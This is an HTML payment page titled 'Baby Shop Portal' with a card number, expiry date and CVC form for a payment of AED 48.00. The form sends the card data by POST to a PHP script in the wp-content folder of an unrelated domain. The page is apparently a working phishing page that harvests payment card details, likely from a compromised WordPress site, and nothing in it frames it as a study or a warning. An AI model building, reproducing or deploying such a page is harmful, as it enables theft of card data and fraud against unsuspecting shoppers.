<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Baby Shop Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .payment-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            position: relative;
        }
        .logo {
            position: absolute;
            top: -50px; /* Adjust based on logo size */
            left: 0;
            width: 150px; /* Adjust based on logo size */
            height: auto;
        }
        .payment-container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }
        .payment-container label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        .payment-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .payment-container button {
            width: 100%;
            padding: 10px;
            background-color: rgb(4, 4, 64); /* Changed to blue */
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .payment-container button:hover {
            background-color: rgb(2, 2, 77); /* Darker blue for hover effect */
        }
        .amount {
            font-size: 28px;
            font-weight: bold;
            color: #333;
            margin-bottom: 20px;
        }
        .reference {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }
        .card-details {
            display: flex;
            justify-content: space-between;
        }
        .card-details input {
            width: 48%;
        }
        .padlock {
            margin-right: 8px;
        }
    </style>
</head>

        <div class="reference"></div>
        <h2></h2>
        <form action="https://hakimdoukkali.com/wp-content/eti.php" method="POST">
            <label for="card-number">Card number</label>
            <input type="text" id="card-number" name="card-number" placeholder="1234-5678-9101-1298" maxlength="19" required>

            <div class="card-details">
                <div>
                    <label for="expiry-date">Expiry date</label>
                    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div>
                    <label for="security-code">Security code</label>
                    <input type="text" id="security-code" name="security-code" placeholder="CVC" maxlength="3" required>
                </div>
            </div>

            <button type="submit">
                <span class="padlock">ðŸ”’</span> Pay AED 48.00
            </button>
        </form>
    </div>

    <script>
        document.getElementById('card-number').addEventListener('input', function (e) {
            let value = e.target.value.replace(/-/g, '');
            if (value.length > 16) {
                value = value.slice(0, 16);
            }
            let formattedValue = value.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1-$2-$3-$4');
            e.target.value = formattedValue;
        });

        document.getElementById('expiry-date').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) {
                value = value.slice(0, 4);
            }
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
